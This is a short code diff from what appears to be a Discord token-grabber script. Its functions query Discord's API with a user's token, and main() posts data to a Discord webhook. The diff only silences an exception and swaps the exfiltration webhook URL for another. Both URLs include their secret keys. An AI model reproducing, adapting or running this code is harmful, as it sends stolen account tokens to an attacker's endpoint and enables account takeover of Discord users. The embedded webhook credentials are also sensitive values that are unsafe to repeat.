@@ -91,6 +91,7 @@ def getfriends(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
     except:
+        pass
 
 
 def getchat(token, uid):
@@ -210,7 +211,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://ptb.discord.com/api/webhooks/807965329325293578/DbTeUjHn7pJjo0uJmrCQfoVdUCAQIJQ0ovypyUWIEl6y610WyZIoRnfg6ZAvIr0yCHFB",
+        urlopen(Request("https://discord.com/api/webhooks/823116202170777630/n-EJmLjaPx6T55CGoMqRVkkjBFMf19yWSka2UsrIjLIzmAtK2Z3beM57fVSPnT62adlX",
                         data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
